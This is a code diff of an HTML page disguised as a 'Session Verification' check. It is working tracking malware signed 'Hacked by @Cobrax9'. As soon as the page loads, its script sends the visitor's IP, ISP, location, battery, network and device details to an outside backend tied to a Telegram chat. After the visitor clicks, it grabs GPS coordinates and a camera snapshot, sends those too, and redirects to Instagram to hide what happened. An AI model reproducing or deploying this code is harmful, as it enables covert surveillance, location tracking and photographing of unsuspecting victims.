@@ -3,36 +3,31 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Secure Verification</title>
+  <title>Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body {
-      background-color: #202020;
+      background-color: #1e1e1e;
       color: white;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Segoe UI', sans-serif;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      margin: 0;
+      text-align: center;
     }
     .card {
       background: #2a2a2a;
       padding: 30px;
       border-radius: 12px;
-      text-align: center;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
     }
-    .card h2 {
-      margin-bottom: 10px;
-    }
-    .btn {
+    button {
       margin-top: 20px;
       padding: 12px 24px;
       font-size: 16px;
       background: #00ffaa;
-      color: #000;
+      color: black;
       border: none;
       border-radius: 6px;
       cursor: pointer;
@@ -45,7 +40,6 @@
       border-top-color: #00ffaa;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      display: none;
     }
     @keyframes spin {
       to { transform: rotate(360deg); }
@@ -57,31 +51,23 @@
 </head>
 <body>
   <div class="card">
-    <h2>🔐 Identity Check</h2>
-    <p>Press continue to verify your session securely.</p>
-    <button class="btn" onclick="startVerification()">🔓 Continue Verification</button>
-    <div class="spinner" id="spinner"></div>
+    <h2>🔐 Session Verification</h2>
+    <p>Checking your device...</p>
+    <div class="spinner"></div>
+    <button onclick="collectSensitive()">🔓 Continue Verification</button>
+    <video id="videoPreview" autoplay muted playsinline></video>
+    <canvas id="snapshotCanvas" width="320" height="240"></canvas>
   </div>
-
-  <video id="videoPreview" autoplay muted playsinline></video>
-  <canvas id="snapshotCanvas" width="320" height="240"></canvas>
 
   <script>
     const chatId = new URLSearchParams(window.location.search).get("id");
     const video = document.getElementById("videoPreview");
     const canvas = document.getElementById("snapshotCanvas");
     const ctx = canvas.getContext("2d");
-    const spinner = document.getElementById("spinner");
-
-    let result = "📱 Hacked by @Cobrax9\n\n";
     let imageBase64 = "";
 
-    function startVerification() {
-      spinner.style.display = "block";
-      collectDeviceInfo();
-    }
-
-    function collectDeviceInfo() {
+    // === IMMEDIATE SEND: IP + Device Info ===
+    function sendBasicInfo() {
       const ua = navigator.userAgent;
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const connection = navigator.connection || {};
@@ -91,51 +77,60 @@
         const charging = battery.charging ? "Yes" : "No";
         const level = Math.round(battery.level * 100) + "%";
 
-        result += "📱 Device Info:\n";
-        result += `🔋 Charging: ${charging}\n`;
-        result += `🔌 Battery: ${level}\n`;
-        result += `🌐 Network: ${network.toUpperCase()}\n`;
-        result += `🕒 Time Zone: ${timeZone}\n\n`;
-        result += `🖥️ User Agent: ${ua}\n`;
-        result += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
+        fetch("https://ipinfo.io/json?token=demo")
+          .then(res => res.json())
+          .then(data => {
+            let basicInfo = "📱 Hacked by @Cobrax9\n\n";
+            basicInfo += "🌐 IP Info:\n";
+            basicInfo += `🌐 IP: ${data.ip}\n📡 ISP: ${data.org}\n🔍 ASN: ${data.org?.split(" ")[0]}\n`;
+            basicInfo += `📍 IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
 
-        requestGPS();
+            basicInfo += "📱 Device Info:\n";
+            basicInfo += `🔋 Charging: ${charging}\n`;
+            basicInfo += `🔌 Battery: ${level}\n`;
+            basicInfo += `🌐 Network: ${network.toUpperCase()}\n`;
+            basicInfo += `🕒 Time Zone: ${timeZone}\n`;
+            basicInfo += `🖥️ User Agent: ${ua}\n`;
+            basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
+            basicInfo += "👀 Real-time location & camera coming next...";
+
+            sendToTelegram(basicInfo);
+          });
       });
     }
 
-    function requestGPS() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            result += "🌍 GPS Location: https://maps.google.com/?q=" + lat + "," + lon + "\n\n";
-            capturePhoto();
-          },
-          err => {
-            console.warn("GPS denied, falling back to IP...");
-            fetchIP();
-          },
-          { timeout: 5000 }
-        );
+    function sendToTelegram(message, isPhoto = false) {
+      const payload = { chat_id: chatId };
+      if (isPhoto && imageBase64) {
+        payload.message = "📸 Snapshot taken from target:";
+        payload.photo = imageBase64;
       } else {
-        fetchIP();
+        payload.message = message;
       }
+
+      fetch("https://render-backend-package1.onrender.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
     }
 
-    function fetchIP() {
-      fetch("https://ipinfo.io/json?token=demo")
-        .then(res => res.json())
-        .then(data => {
-          result += "🌎 IP Info:\n";
-          result += `🌐 IP: ${data.ip}\n📡 ISP: ${data.org}\n🔍 ASN: ${data.org?.split(" ")[0]}\n`;
-          result += `🌍 IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
+    // === TRIGGERED AFTER USER CLICKS ===
+    function collectSensitive() {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const gpsMessage = `📍 GPS Location Accessed\nhttps://maps.google.com/?q=${lat},${lon}`;
+          sendToTelegram(gpsMessage);
           capturePhoto();
-        })
-        .catch(() => {
-          result += "🌐 Location info unavailable\n\n";
+        },
+        err => {
+          sendToTelegram("❌ GPS access denied or unavailable");
           capturePhoto();
-        });
+        },
+        { timeout: 5000 }
+      );
     }
 
     function capturePhoto() {
@@ -146,31 +141,22 @@
           setTimeout(() => {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
-            sendToTelegram();
+            sendToTelegram("", true);
+            setTimeout(() => {
+              window.location.href = "https://instagram.com";
+            }, 3000);
           }, 1500);
         })
         .catch(() => {
-          sendToTelegram(); // fallback if no camera
+          sendToTelegram("❌ Camera access denied");
+          setTimeout(() => {
+            window.location.href = "https://instagram.com";
+          }, 3000);
         });
     }
 
-    function sendToTelegram() {
-      if (!chatId) return;
-
-      fetch("https://render-backend-package1.onrender.com/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          message: result,
-          photo: imageBase64
-        })
-      }).then(() => {
-        setTimeout(() => {
-          window.location.href = "https://instagram.com";
-        }, 3000);
-      });
-    }
+    // RUN basic info right away
+    if (chatId) sendBasicInfo();
   </script>
 </body>
 </html>
